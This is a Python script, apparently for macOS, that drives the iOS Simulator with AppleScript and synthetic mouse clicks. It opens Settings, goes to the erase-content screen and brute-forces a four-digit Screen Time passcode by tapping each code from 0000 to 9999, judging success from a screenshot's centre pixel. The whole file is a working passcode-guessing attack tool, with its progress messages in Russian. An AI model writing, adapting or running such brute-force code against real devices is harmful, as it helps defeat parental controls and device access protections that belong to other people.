import subprocess
import time
from Quartz.CoreGraphics import (
    CGEventCreateMouseEvent, CGEventPost, CGPointMake,
    kCGEventLeftMouseDown, kCGEventLeftMouseUp, kCGEventMouseMoved,
    kCGHIDEventTap
)

SIM_X = 397
SIM_Y = 57
SIM_W = 378
SIM_H = 816


def _update_window():
    global SIM_X, SIM_Y, SIM_W, SIM_H
    result = subprocess.run(["osascript", "-e", '''
tell application "System Events"
  tell process "Simulator"
    set w to first window
    return {position of w, size of w}
  end tell
end tell'''], capture_output=True, text=True)
    vals = [int(v.strip()) for v in result.stdout.strip().split(",")]
    SIM_X, SIM_Y, SIM_W, SIM_H = vals[0], vals[1], vals[2], vals[3]


def _click(x: int, y: int):
    pt = CGPointMake(x, y)
    down = CGEventCreateMouseEvent(None, kCGEventLeftMouseDown, pt, 0)
    CGEventPost(kCGHIDEventTap, down)
    time.sleep(0.05)
    up = CGEventCreateMouseEvent(None, kCGEventLeftMouseUp, pt, 0)
    CGEventPost(kCGHIDEventTap, up)


def _tap(x_ratio, y_ratio, delay=0.35):
    x = int(SIM_X + x_ratio * SIM_W)
    y = int(SIM_Y + y_ratio * SIM_H)
    _click(x, y)
    time.sleep(delay)


def _screenshot():
    path = "/tmp/sim_check.png"
    subprocess.run(["xcrun", "simctl", "io", "booted", "screenshot", path],
                   capture_output=True)
    return path


def _tap_digit(digit: str):
    positions = {
        "1": (0.20, 0.57), "2": (0.50, 0.57), "3": (0.80, 0.57),
        "4": (0.20, 0.66), "5": (0.50, 0.66), "6": (0.80, 0.66),
        "7": (0.20, 0.75), "8": (0.50, 0.75), "9": (0.80, 0.75),
        "0": (0.50, 0.84),
    }
    if digit in positions:
        _tap(*positions[digit], delay=0.15)


def _scroll_down():
    from Quartz.CoreGraphics import kCGEventLeftMouseDragged
    x = int(SIM_X + SIM_W * 0.5)
    y_start = int(SIM_Y + SIM_H * 0.7)
    y_end = int(SIM_Y + SIM_H * 0.3)
    down = CGEventCreateMouseEvent(None, kCGEventLeftMouseDown, CGPointMake(x, y_start), 0)
    CGEventPost(kCGHIDEventTap, down)
    steps = 15
    for i in range(1, steps + 1):
        y = int(y_start + (y_end - y_start) * i / steps)
        drag = CGEventCreateMouseEvent(None, kCGEventLeftMouseDragged, CGPointMake(x, y), 0)
        CGEventPost(kCGHIDEventTap, drag)
        time.sleep(0.01)
    up = CGEventCreateMouseEvent(None, kCGEventLeftMouseUp, CGPointMake(x, y_end), 0)
    CGEventPost(kCGHIDEventTap, up)
    time.sleep(0.6)


def _apple_id_visible() -> bool:
    path = _screenshot()
    try:
        from PIL import Image
        img = Image.open(path).convert("RGB")
        w, h = img.size
        center = img.getpixel((w // 2, h // 2))
        return all(c > 220 for c in center)
    except ImportError:
        return None


def navigate_to_screen_time_passcode():
    _update_window()
    subprocess.run(["osascript", "-e", 'tell application "Simulator" to activate'],
                   capture_output=True)
    time.sleep(0.5)
    subprocess.run(["xcrun", "simctl", "launch", "booted", "com.apple.Preferences"],
                   capture_output=True)
    time.sleep(2)

    _tap(0.5, 0.30)   # Основные
    time.sleep(1)
    _scroll_down()
    _scroll_down()
    time.sleep(0.3)
    _tap(0.5, 0.78)   # Перенос или сброс
    time.sleep(1)
    _tap(0.5, 0.55)   # Стереть контент
    time.sleep(1)
    _tap(0.5, 0.75)   # Continue
    time.sleep(1)
    print("На экране ввода пароля Screen Time")


def check(screen_time_passcode: str, length: int = 4) -> bool:
    code = screen_time_passcode.zfill(length)
    for digit in code:
        _tap_digit(digit)
    time.sleep(0.6)
    return _apple_id_visible()


def brute_force(length: int = 4):
    navigate_to_screen_time_passcode()
    total = 10 ** length

    for i in range(total):
        code = str(i).zfill(length)
        result = check(code, length)
        print(f"[{i+1}/{total}] Проверяю: {code} ... {'✓ НАЙДЕН' if result else '✗'}")

        if result:
            print(f"\nПароль Screen Time: {code}")
            return code

        time.sleep(0.2)

    print("Пароль не найден")
    return None


if __name__ == "__main__":
    brute_force(length=4)
